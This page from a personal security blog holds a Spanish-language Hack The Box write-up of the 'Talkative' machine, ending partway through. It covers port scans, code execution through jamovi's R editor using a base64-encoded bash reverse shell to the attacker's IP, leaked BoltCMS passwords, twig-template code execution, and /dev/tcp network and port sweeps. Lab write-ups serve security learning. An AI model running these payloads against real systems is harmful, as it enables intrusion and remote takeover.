<!doctype html>
<html lang="es-ES"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <title>Bajo el Teclado</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="" />

    
    
    
    <link rel="stylesheet" href="../../css/theme.min.css">

    
    
    

    
  


</head>
<body>
        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
    <div class="row">
        
        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
            <a href="../../" class="text-decoration-none">
                <img id="home-image" class="rounded-circle"
                    
                        
                            src="../../pointed.jpeg"
                        
                    
                />
            </a>
        </div>
        <div class="col-sm-8 col-12 text-sm-left text-center">
        
            <h2 class="m-0 mb-2 mt-4">
                <a href="../../" class="text-decoration-none">
                    
                        pointedsec
                    
                </a>
            </h2>
            <p class="text-muted mb-1">
                
                    if pentester.found == bug { make(pentester,states.happy) }
                
            </p>
            <ul id="nav-links" class="list-inline mb-2">
                
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../" title="Home">/Home</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../about/" title="About">About</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../writeups/" title="Write-Up&#39;s">Write-Up&#39;s</a>
                    </li>
                
            </ul>
            <ul id="nav-social" class="list-inline">
                
                    <li class="list-inline-item mr-3">
                        <a href="http://github.com/pointedsec" target="_blank">
                            <i class="fab fa-github fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://www.linkedin.com/in/andr%C3%A9s-del-cerro-rodr%C3%ADguez-13a826293/" target="_blank">
                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="mailto:adelcerrorodriguez@gmail.com" target="_blank">
                            <i class="fas fa-at fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://pointedsec.vercel.app" target="_blank">
                            <i class="fas fa-globe fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://app.hackthebox.com/profile/1575364" target="_blank">
                            <i class="fas fa-box fa-1x text-muted"></i>
                        </a>
                    </li>
                
            </ul>
        </div>
    </div>
    <hr />
</header>
<div class="container">
    <div class="pl-sm-4 ml-sm-5">
        <h1 id="hack-the-box-talkative-writeup">Hack The Box: Talkative Writeup</h1>
<p>Welcome to my detailed writeup of the hard difficulty machine <strong>&ldquo;Talkative&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
<h1 id="tcp-enumeration">TCP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rustscan -a 10.129.222.158 --ulimit <span style="color:#ae81ff">5000</span> -g
</span></span><span style="display:flex;"><span>10.129.222.158 -&gt; <span style="color:#f92672">[</span>80,8080,8081,8082<span style="color:#f92672">]</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p80,8080,8081,8082 -sCV 10.129.222.158 -oN allPorts
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-06 20:02 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.222.158
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.037s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>80/tcp   open  http    Apache httpd 2.4.52
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.52 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://talkative.htb
</span></span><span style="display:flex;"><span>8080/tcp open  http    Tornado httpd 5.0
</span></span><span style="display:flex;"><span>|_http-title: jamovi
</span></span><span style="display:flex;"><span>|_http-server-header: TornadoServer/5.0
</span></span><span style="display:flex;"><span>8081/tcp open  http    Tornado httpd 5.0
</span></span><span style="display:flex;"><span>|_http-server-header: TornadoServer/5.0
</span></span><span style="display:flex;"><span>|_http-title: 404: Not Found
</span></span><span style="display:flex;"><span>8082/tcp open  http    Tornado httpd 5.0
</span></span><span style="display:flex;"><span>|_http-server-header: TornadoServer/5.0
</span></span><span style="display:flex;"><span>|_http-title: 404: Not Found
</span></span><span style="display:flex;"><span>Service Info: Host: 172.17.0.15
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 8.91 seconds
</span></span></code></pre></div><h1 id="udp-enumeration">UDP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nmap --top-ports <span style="color:#ae81ff">1500</span> -sU --min-rate <span style="color:#ae81ff">5000</span> -n -Pn 10.129.222.158 -oN allPorts.UDP
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-06 20:03 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.222.158
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.037s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">1494</span> open|filtered udp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT      STATE  SERVICE
</span></span><span style="display:flex;"><span>959/udp   closed unknown
</span></span><span style="display:flex;"><span>1060/udp  closed polestar
</span></span><span style="display:flex;"><span>21566/udp closed unknown
</span></span><span style="display:flex;"><span>23585/udp closed unknown
</span></span><span style="display:flex;"><span>34433/udp closed unknown
</span></span><span style="display:flex;"><span>41058/udp closed unknown
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.82 seconds
</span></span></code></pre></div><h1 id="http-enumeration">HTTP Enumeration</h1>
<p>Encontramos un dominio, <code>talkative.htb</code> y detectamos 4 servicios web.
<code>80/TCP</code> , <code>8080/TCP</code> , <code>8081/TCP</code> , <code>8082/TCP</code></p>
<p>Enumerando los servicios HTTP podemos encontrar varios posibles usuarios.</p>
<ul>
<li>Matt Williams</li>
<li>Janit Smith</li>
<li>Saul Goodman</li>
</ul>
<h2 id="html-injection">HTML Injection</h2>
<p>Encuentro este punto que es vulnerable a inyección HTML. Pero no he conseguido cargar scripts maliciosos, me lo apunto por si mas adelante hace falta.
<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
<p>Tambien fuzzeando parece que tiene una especie de Rate Limiter por lo cual hace mas complicado el reconocimiento.</p>
<p>También encontramos un formulario, que tras inspeccionar el código no he visto la etiqueta <code>&lt;form&gt;</code> , al intentar enviarlo salta lo siguiente.
<img src="images/Screenshot_2.png" alt="Write-up Image"></p>
<p>En la página se ofrecen servicios de mensajería, SMS, chat&hellip;
Por lo cual voy a apuntarme los correos electrónicos por si los necesito.</p>
<h2 id="discovering-boltcms">Discovering BoltCMS</h2>
<p>Analizando las cabeceras encontramos que probablemente exista un BoltCMS detrás. Y además encontrado un recurso <code>/api/docs.json</code> que nos muestra varios endpoints.
<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
<p>Probando algunas rutas de estos endpoints, fui redireccionado al panel de BoltCMS
<img src="images/Screenshot_4.png" alt="Write-up Image"></p>
<p>Existen varias vulnerabilidades asociadas a BoltCMS. Por lo cual probablemente tenga que buscar la forma de poder iniciar sesión.
<img src="images/Screenshot_5.png" alt="Write-up Image"></p>
<h2 id="abusing-jamovi--container--1-foothold">Abusing Jamovi | Container  1 Foothold</h2>
<p>Vemos por el puerto 8080 un servicio <code>jamovi</code> el cual tiene una vulnerabilidad XSS asociada, y casualmente el mensaje de &ldquo;bienvenida&rdquo; es realizando un aviso de seguridad. Revisando el <a href="https://github.com/theart42/cves/blob/master/CVE-2021-28079/CVE-2021-28079.md">CVE-2021-28079</a> vemos que este XSS se basa en la explotación de un fallo en ElectronJS, por lo cual podríamos fabricar un document .omv que contenta un payload y cuando sea abierto por la víctima, podremos conseguir ejecución de comandos.
<img src="images/Screenshot_6.png" alt="Write-up Image"></p>
<p>Re-leyendo los mensajes de la página principal, quiero pensar que van por aquí los tiros.
<img src="images/Screenshot_7.png" alt="Write-up Image"></p>
<p>Podemos ver incluso la raíz del sistema de la máquina que está hosteando esta instancia de jamovi.
<img src="images/Screenshot_9.png" alt="Write-up Image"></p>
<p>Aunque esta instancia tiene instalado el módulo <code>Rj - Editor</code> por lo cual podemos ejecutar código en <code>R</code>
<img src="images/Screenshot_10.png" alt="Write-up Image"></p>
<p><a href="https://www.r-bloggers.com/2021/09/how-to-use-system-commands-in-your-r-script-or-package">En este post</a> podemos ver como ejecutar comandos a nivel de sistema en <code>R</code></p>
<p><img src="images/Screenshot_11.png" alt="Write-up Image"></p>
<p>Nos podemos poner en escucha con <code>netcat</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
</span></span></code></pre></div><p>Y con el siguiente payload ganar acceso</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-R" data-lang="R"><span style="display:flex;"><span><span style="color:#a6e22e">system2</span>(<span style="color:#e6db74">&#34;echo&#34;</span>, <span style="color:#e6db74">&#34;L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjkxLzQ0MyAwPiYx|base64 -d|bash&#34;</span>, stdout <span style="color:#f92672">=</span> <span style="color:#66d9ef">TRUE</span>, stderr <span style="color:#f92672">=</span> <span style="color:#66d9ef">TRUE</span>)
</span></span></code></pre></div><p>Y podemos ver que ganamos acceso como <code>root</code> a un contenedor.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.91<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.222.158<span style="color:#f92672">]</span> <span style="color:#ae81ff">56386</span>
</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
</span></span><span style="display:flex;"><span>bash: no job control in this shell
</span></span><span style="display:flex;"><span>root@b06821bbda78:/# whoami
</span></span><span style="display:flex;"><span>whoami
</span></span><span style="display:flex;"><span>root
</span></span><span style="display:flex;"><span>root@b06821bbda78:/# ip a
</span></span><span style="display:flex;"><span>ip a
</span></span><span style="display:flex;"><span>bash: ip: command not found
</span></span><span style="display:flex;"><span>root@b06821bbda78:/# ifconfig
</span></span><span style="display:flex;"><span>ifconfig
</span></span><span style="display:flex;"><span>bash: ifconfig: command not found
</span></span><span style="display:flex;"><span>root@b06821bbda78:/# hostname -I
</span></span><span style="display:flex;"><span>hostname -I
</span></span><span style="display:flex;"><span>172.18.0.2 
</span></span><span style="display:flex;"><span>root@b06821bbda78:/#
</span></span></code></pre></div><h2 id="information-leakage">Information Leakage</h2>
<p>Encontramos en el directorio <code>/root</code> un archivo <code>bolt-administration.omv</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@b06821bbda78:~# ls -la
</span></span><span style="display:flex;"><span>ls -la
</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">32</span>
</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Mar  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2022</span> .
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Mar  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2022</span> ..
</span></span><span style="display:flex;"><span>lrwxrwxrwx <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">9</span> Mar  <span style="color:#ae81ff">7</span>  <span style="color:#ae81ff">2022</span> .bash_history -&gt; /dev/null
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">3106</span> Oct <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2015</span> .bashrc
</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">6</span> 16:47 .jamovi
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">148</span> Aug <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2015</span> .profile
</span></span><span style="display:flex;"><span>drwxrwxrwx <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">4096</span> Aug  <span style="color:#ae81ff">6</span> 16:45 Documents
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">2192</span> Aug <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2021</span> bolt-administration.omv
</span></span></code></pre></div><p>Nos podemos pasar este archivo a nuestra máquina codificándolo en base64 y en nuestra máquina decodificándolo y luego con <code>md5sum</code> comprobar la integridad del archivo</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@b06821bbda78:~# md5sum bolt*
</span></span><span style="display:flex;"><span>md5sum bolt*
</span></span><span style="display:flex;"><span>89a471297760280c51d7a48246f95628  bolt-administration.omv
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ md5sum bolt-administration.omv 
</span></span><span style="display:flex;"><span>89a471297760280c51d7a48246f95628  bolt-administration.omv
</span></span></code></pre></div><p>Con <code>file</code> nos reporta que es un archivo JAR</p>
<p>Por lo cual podemos descomprimirlo y echarle un vistazo</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ unzip bolt-administration.omv
</span></span><span style="display:flex;"><span>Archive:  bolt-administration.omv
</span></span><span style="display:flex;"><span>  inflating: META-INF/MANIFEST.MF    
</span></span><span style="display:flex;"><span>  inflating: meta                    
</span></span><span style="display:flex;"><span>  inflating: index.html              
</span></span><span style="display:flex;"><span>  inflating: metadata.json           
</span></span><span style="display:flex;"><span>  inflating: xdata.json              
</span></span><span style="display:flex;"><span>  inflating: data.bin                
</span></span><span style="display:flex;"><span>  inflating: <span style="color:#ae81ff">01</span> empty/analysis
</span></span></code></pre></div><p>Encontramos un archivo <code>xdata.json</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;A&#34;</span>: {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;labels&#34;</span>: [
</span></span><span style="display:flex;"><span>      [
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Username&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Username&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>      ],
</span></span><span style="display:flex;"><span>      [
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;matt@talkative.htb&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;matt@talkative.htb&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>      ],
</span></span><span style="display:flex;"><span>      [
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">2</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;janit@talkative.htb&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;janit@talkative.htb&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>      ],
</span></span><span style="display:flex;"><span>      [
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">3</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;saul@talkative.htb&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;saul@talkative.htb&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>      ]
</span></span><span style="display:flex;"><span>    ]
</span></span><span style="display:flex;"><span>  },
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;B&#34;</span>: {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;labels&#34;</span>: [
</span></span><span style="display:flex;"><span>      [
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Password&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Password&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>      ],
</span></span><span style="display:flex;"><span>      [
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">1</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;jeO09ufhWD&lt;s&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;jeO09ufhWD&lt;s&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>      ],
</span></span><span style="display:flex;"><span>      [
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">2</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;bZ89h}V&lt;S_DA&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;bZ89h}V&lt;S_DA&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>      ],
</span></span><span style="display:flex;"><span>      [
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">3</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;)SQWGm&gt;9KHEA&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;)SQWGm&gt;9KHEA&#34;</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>      ]
</span></span><span style="display:flex;"><span>    ]
</span></span><span style="display:flex;"><span>  },
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;C&#34;</span>: {
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;labels&#34;</span>: []
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="abusing-boltcms--docker-container-2">Abusing BoltCMS | Docker Container 2</h2>
<p>Ahora que tenemos credenciales podemos intentar iniciar sesión en el BoltCMS
<img src="images/Screenshot_12.png" alt="Write-up Image"></p>
<p>Probando con <code>admin:bZ89h}V&lt;S_DA</code> consigo iniciar sesión.
Siguiendo este artículo de <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/bolt-cms">HackTricks</a></p>
<p>Puedo fijarme en el tema actual que esté en uso, e intentar editarlo para siguiendo el formato en .twig, ejecutar comandos en el sistema de forma remota.</p>
<p>El tema es <code>base-2021</code>
<img src="images/Screenshot_14.png" alt="Write-up Image"></p>
<p>Editamos la plantilla y añadimos nuestro payload..
<img src="images/Screenshot_15.png" alt="Write-up Image"></p>
<p><strong>Ahora nos dirigimos a Maintenance -&gt; Clear the Cache</strong></p>
<p>Y si nos ponemos en escucha con <code>netcat</code> y recargamos la página inicial&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.91<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.222.158<span style="color:#f92672">]</span> <span style="color:#ae81ff">44350</span>
</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
</span></span><span style="display:flex;"><span>bash: no job control in this shell
</span></span><span style="display:flex;"><span>www-data@6d4489211cb5:/var/www/talkative.htb/bolt/public$ hostname -I
</span></span><span style="display:flex;"><span>hostname -I
</span></span><span style="display:flex;"><span>172.17.0.15 
</span></span><span style="display:flex;"><span>www-data@6d4489211cb5:/var/www/talkative.htb/bolt/public$
</span></span></code></pre></div><p>En esta máquina no encontramos nada importante, además que no consigo escalar a <code>root</code></p>
<h2 id="escaping-the-container--network-reconnaissance">Escaping the Container | Network Reconnaissance</h2>
<p>Podemos hacer un one-liner en bash para escanear nuestro entorno</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>1..254<span style="color:#f92672">}</span>; <span style="color:#66d9ef">do</span> timeout <span style="color:#ae81ff">1</span> bash -c <span style="color:#e6db74">&#34;echo &gt;/dev/tcp/172.17.0.</span>$i<span style="color:#e6db74">/80&#34;</span> 2&gt;/dev/null <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;Host 172.17.0.</span>$i<span style="color:#e6db74"> is up&#34;</span>; <span style="color:#66d9ef">done</span>
</span></span></code></pre></div><p>Nos reporta una gran lista.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>Host 172.17.0.1 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.2 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.3 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.4 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.5 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.6 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.7 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.8 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.9 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.10 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.11 is up
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Host 172.17.0.12 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.13 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.14 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.15 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.16 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.17 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.18 is up
</span></span><span style="display:flex;"><span>Host 172.17.0.19 is up
</span></span></code></pre></div><p>Podemos crearnos un pequeño escáner de puertos.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>IP<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$1<span style="color:#e6db74">&#34;</span>; <span style="color:#66d9ef">for</span> port in <span style="color:#66d9ef">$(</span>seq <span style="color:#ae81ff">1</span> 65535<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> <span style="color:#f92672">(</span>echo <span style="color:#e6db74">&#39;.&#39;</span> &gt;/dev/tcp/$IP/$port <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#34;OPEN: </span>$port<span style="color:#e6db74">&#34;</span> &amp;<span style="color:#f92672">)</span> 2&gt;/dev/null; <span style="color:#66d9ef">done</span>
</span></span></code></pre></div><p>(Estoy utilizando <code>pwncat-cs</code> de ahí el formato de la shell)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">(</span>remote<span style="color:#f92672">)</span> www-data@6d4489211cb5:/tmp$ ./portscan.sh 172.17.0.1
</span></span><span style="display:flex;"><span>OPEN: <span style="color:#ae81ff">22</span>
</span></span><span style="display:flex;"><span>OPEN: <span style="color:#ae81ff">80</span>
</span></span><span style="display:flex;"><span>OPEN: <span style="color:#ae81ff">6000</span>
</span></span><span style="display:flex;"><span>OPEN: <span style="color:#ae81ff">6001</span>
</span></span><span style="display:flex;"><span>OPEN: <span style="color:#ae81ff">6002</span>
</span></span><span style="display:flex;"><span>OPEN: <span style="color:#ae81ff">6003</span>
</span></span><span style="display:flex;"><span>OPEN: <span style="color:#ae81ff">6004</span>
</span></span><span style="display:flex;"><span>OPEN: <span style="color:#ae81ff">6005</span>
</span></span><span style="display:flex;"><span>OPEN: <span style="color:#ae81ff">6006</span>
</span></span><span style="display:flex;"><span>OPEN: <span style="color:#ae81ff">6007</span>
</span></span><span style="display:flex;"><span>OPEN: <span style="color:#ae81ff">6008</span>
</span></span><span style="display:flex;"><span>OPEN: <span style="color:#ae81ff">6009</span>
</span></span><span style="display:flex;"><span>OPEN: <span style="color:#ae81ff">6010</span>
</span></span><span style="display:flex;"><span>OPEN: <span style="color:#ae81ff">6011</span>
</span></span><span style="display:flex;"><span>OPEN: <span style="color:#ae81ff">6012</span>
</span></span><span style="display:flex;"><span>OPEN: <span style="color:#ae81ff">6013</span>
</span></span><span style="display:flex;"><span>OPEN: <span style="color:#ae81ff">6014</span>
</span></span><span style="display:flex;"><span>OPEN: <span style="color:#ae81ff">6015</span>
</span></span><span style="display:flex;"><span>OPEN: <span style="color:#ae81ff">8080</span>
</span></span><span style="display:flex;"><span>OPEN: <span style="color:#ae81ff">8081</span>
</span></span><span style="display:flex;"><span>OPEN: <span style="color:#ae81ff">8082</span>
</span></span></code></pre></div><p>Vemos que está abierto el puerto 22/TCP (SSH) cosa que no está de forma externa en la máquina 172.17.0.1, que supongo que será la máquina víctima.</p>
<h2 id="reverse-port-forwarding">Reverse Port Forwarding</h2>
<p>Para trabajar de forma cómoda y poder utilizar <code>hydra</code> para hacer un ataque por diccionario. Voy a utilizar <code>chisel</code> para hacer reverse port-forwarding.</p>
<p><img src="images/Screenshot_17.png" alt="Write-up Image">Para ello, con <code>pwncat-cs</code> (lo estoy probando :) ) nos compartimos el <code>chisel</code></p>
